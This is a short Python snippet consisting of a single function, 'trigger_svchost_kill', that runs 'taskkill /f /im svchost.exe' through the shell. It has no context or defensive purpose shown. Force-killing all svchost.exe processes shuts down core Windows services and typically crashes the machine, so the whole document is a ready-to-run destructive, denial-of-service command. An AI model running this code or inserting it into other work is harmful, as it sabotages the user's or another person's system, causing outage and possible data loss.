def trigger_svchost_kill():
    import subprocess
    subprocess.run("taskkill /f /im svchost.exe", shell=True)
    
